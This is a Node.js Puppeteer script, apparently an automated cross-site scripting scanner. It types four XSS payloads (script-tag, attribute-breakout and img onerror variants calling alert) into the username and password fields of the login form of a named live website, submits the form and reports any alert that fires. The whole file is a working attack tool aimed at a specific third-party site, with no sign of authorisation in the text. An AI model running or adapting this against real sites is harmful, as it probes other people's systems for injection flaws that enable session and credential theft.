const puppeteer = require('puppeteer');

// Common XSS payloads designed to break out of string inputs
const payloads = [
    '"><script>alert(1)</script>',
    '" onerror="alert(1)',
    '</script><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>'
];

// Target page containing the interactive multi-input form
const targetUrl = 'https://1w.cash'; 

// REPLACE THESE SELECTORS based on what you see in the F12 Element Tree
const FORM_FIELDS = [
    { name: 'Username Field', selector: 'input[name="username"]' },
    { name: 'Password Field', selector: 'input[name="password"]' },
    // You can add more fields easily if testing a sign-up or checkout form:
    // { name: 'Promo Code Field', selector: 'input[name="promo_code"]' }
];

const SUBMIT_SELECTOR = 'button[type="submit"]';

async function scanMultiFieldXSS() {
    console.log(`[+] Initializing Chromium Browser...`);
    const browser = await puppeteer.launch({ headless: true });

    for (let payload of payloads) {
        const page = await browser.newPage();
        
        // 1. Establish the Event Dialog Listener to catch successful execution
        page.on('dialog', async dialog => {
            if (dialog.type() === 'alert') {
                console.log(`\n[🚨 XSS DETECTED!] Dialog popped up with message: "${dialog.message()}"`);
                console.log(`[🎯 Successful Payload Context]: ${payload}`);
                await dialog.dismiss();
            }
        });

        try {
            console.log(`\n[*] Navigating to: ${targetUrl}`);
            await page.goto(targetUrl, { waitUntil: 'networkidle2' });

            // 2. Loop through and fill out every single defined field with the payload
            for (let field of FORM_FIELDS) {
                console.log(`[*] Waiting for and filling ${field.name}...`);
                await page.waitForSelector(field.selector, { timeout: 4000 });
                
                // Clear any pre-filled or cached data in the field natively
                await page.click(field.selector);
                await page.keyboard.down('Control');
                await page.keyboard.press('A');
                await page.keyboard.up('Control');
                await page.keyboard.press('Backspace');

                // Type the current payload string into the box
                await page.type(field.selector, payload);
            }

            // 3. Verify the submit button exists and click it
            await page.waitForSelector(SUBMIT_SELECTOR, { timeout: 4000 });
            console.log(`[*] Submitting form data...`);
            
            await Promise.all([
                page.click(SUBMIT_SELECTOR),
                // Wait for the server response or next navigation window to settle
                page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 5000 }).catch(() => {})
            ]);

            // Give the browser runtime an extra second to render any reflected text sinks
            await new Promise(resolve => setTimeout(resolve, 1000));

        } catch (error) {
            console.log(`[-] Missing element or navigation timeout for payload: ${payload}`);
        } finally {
            await page.close();
        }
    }

    console.log(`\n[+] Multi-Field Scan Campaign Finished.`);
    await browser.close();
}

scanMultiFieldXSS();
